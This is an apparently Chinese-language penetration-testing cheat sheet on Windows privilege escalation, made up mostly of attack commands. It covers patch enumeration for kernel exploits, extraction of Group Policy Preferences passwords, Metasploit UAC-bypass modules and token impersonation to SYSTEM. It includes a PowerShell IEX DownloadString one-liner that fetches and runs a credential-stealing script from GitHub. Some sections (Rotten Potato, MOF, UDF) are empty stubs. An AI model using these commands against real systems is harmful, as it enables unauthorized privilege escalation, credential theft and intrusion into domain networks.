chcp 65001

[参考指南](https://cloud.tencent.com/developer/article/1771226)
## 系统内核溢出提权

查找补丁

```copy
#手工查找补丁情况 
systeminfo 
Wmic qfe get Caption,Description,HotFixID,InstalledOn 
#MSF后渗透扫描 
post/windows/gather/enum_patches post/multi/recon/local_exploit_suggester 
#windows exploit suggester https://github.com/AonCyberLabs/Windows-Exploit-Suggester #powershell中的sherlock脚本 Import-Module C:\Sherlock.ps1 #下载ps1脚本，导入模块 Find-AllVulns 
#Empire内置模块 Empire框架也提供了关于内核溢出漏洞提权的漏洞利用方法 usemodule privesc/powerup/allchecks 
execute 
```
查找到缺失的补丁后，对照相应的系统版本，查找对应的exp

```copy
https://github.com/SecWiki/windows-kernel-exploits https://bugs.hacking8.com/tiquan/ https://github.com/Heptagrams/Heptagram/tree/master/Windows/Elevation 
https://www.exploit-db.com/ https://i.hacking8.com/tiquan/ ...........
```

## 系统配置错误提权

## 组策略首选项提权

简介：Windows 2008 Server引入了一项新功能：策略首选项，组策略首选项使管理员可以部署影响域中计算机/用户的特定配置，通过在组策略管理控制台中配置的组策略首选项，管理员可以推出多种策略，例如，当用户登录其计算机时自动映射网络驱动器，更新内置管理员帐户的用户名或对注册表进行更改。

##### SYSVOL：

SYSVOL是AD(活动目录)里面一个存储域公共文件服务器副本的共享文件夹，所有的认证用户都可以读取。SYSVOL包括登录脚本，组策略数据，以及其他域控所需要的域数据，这是因为SYSVOL能在所有域控里进行自动同步和共享。

所有的组策略均存储在如下位置：

```javascript
\\<DOMAIN>\SYSVOL\<DOMAIN>\Policies\
```

复制

##### 组策略偏好GPP

win2008发布了GPP(Group Policy Preferences)，其中GPP最有用的特性，是在某些场景存储和使用凭据，其中包括：映射驱动（Drives.xml）创建本地用户数据源（DataSources.xml）打印机配置（Printers.xml）创建/更新服务（Services.xml）计划任务（ScheduledTasks.xml）更改本地Administrator密码

为方便对所有机器进行操作，网络管理员会使用域策略进行统一的配置和管理，那么所有机器的本地管理员密码就是一样的，造成了即使不知道密码的情况下也能修改组策略首选项的密码，也可以通过脚本破解组策略首选项文件中密码的漏洞。

利用手法：

```javascript
#Powershell获取cpassword
Get-GPPPassword.ps1

#PowerSploit 的 Get-GPPPassword模块 检索通过组策略首选项推送的帐户的明文密码和其他信息。
powershell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1');Get-GPPPassword"Import-Module .\Get-GPPPassword.ps1;Get-GPPPassword
kali gpp-decrypt命令破解密码

#Msf
run post/windows/gather/credentials/gpp

#Empire
usemodule privesc/gpp
```

## Byass UAC 提权

```copy
#Msf 
exploit/windows/local/ask #弹出UAC确认窗口，点击后获得system权限 exploit/windows/local/bypassuac #此模块将通过进程注入使用可信任发布者证书绕过Windows UAC，它将生成关闭UAC标志的第二个shell。 exploit/windows/local/bypassuac_injection #此模块将通过进程注入使用可信任的发布者证书绕过Windows UAC。它将生成关闭UAC标志的第二个shell。在普通技术中，该模块使用反射式DLL注入技术并只除去了DLL payload 二进制文件，而不是三个单独的二进制文件。但是，它需要选择正确的体系架构（对于SYSWOW64系统也使用x64）。如果指定exe::custom，应在单独的进程中启动 payload 后调用ExitProcess（） 
exploit/windows/local/bypassuac_fodhelper#此模块将通过在当前用户配置单元下劫持注册表中的特殊键并插入将在启动Windows fodhelper.exe应用程序时调用的自定义命令来绕过Windows 10 UAC。它将生成关闭UAC标志的第二个shell。此模块修改注册表项，但在调用payload后将清除该项。该模块不需要payload的体系架构和操作系统匹配。如果指定exe:custom，则应在单独的进程中启动payload后调用ExitProcess（）。 exploit/windows/local/bypassuac_eventvwr#此模块将通过在当前用户配置单元下劫持注册表中的特殊键并插入将在启动Windows事件查看器时调用的自定义命令来绕过Windows UAC。它将生成关闭UAC标志的第二个shell。此模块修改注册表项，但在调用payload后将清除该项。该模块不需要payload的体系架构和操作系统匹配。如果指定EXE ::Custom，则应在单独的进程中启动payload后调用ExitProcess（） 
exploit/windows/local/bypassuac_comhijack#此模块将通过在hkcu配置单元中创建COM处理程序注册表项来绕过Windows UAC。当加载某些较高完整性级别进程时，会引用这些注册表项，从而导致进程加载用户控制的DLL,这些DLL包含导致会话权限提升的payload。此模块修改注册表项，但在调用payload后将清除该项,这个模块需要payload的体系架构和操作系统匹配，但是当前的低权限meterpreter会话体系架构中可能不同。如果指定exe:：custom，则应在单独的进程中启动payloa后调用ExitProcess（）。此模块通过目标上的cmd.exe调用目标二进制文件,因此，如果cmd.exe访问受到限制，此模块将无法正常运行。 #Powershell 
Invoke-PsUACme 
#Empire 
usemodule privesc/bypassuac 
usemodule privesc/bypassuac_wscript 
#cs 
uac-dll 
uac-token-duplication ....
```

## 令牌窃取

MSF
在获取到 Meterpreter Shell 后，使用以下命令获取令牌
```copy
load incognito
list_tokens -u
```
这里有两种令牌，一个是 Delegation Tokens 即授权令牌，还有一种是 Impersonation Tokens 即模拟令牌。前者支持交互式登录比如远程桌面，后者支持非交互的会话。

令牌获取的数量取决于获取到 Shell 的权限等级。

如果已经获取到了 SYSTEM 权限的令牌，那么攻击者就可以伪造这个令牌，拥有对应的权限。
```copy
impersonate_token "NT AUTHORITY\SYSTEM"
```

Rotten Potato 本地提权




## 数据库提权

### MOF提权
简介：MOF文件是mysql数据库的扩展文件（在c:/windows/system32/wbem/mof/nullevt.mof）叫做”托管对象格式”，其作用是每隔五秒就会去监控进程创建和死亡，因为MOF文件每五秒就会执行，且是系统权限，所以如果我们有权限替换原有的mof文件，就能获得system权限

### UDF提权
简介：UDF,user defined funcion,即用户自定义函数，用户可以通过自己增加函数对mysql功能进行扩充，文件后缀为.dll。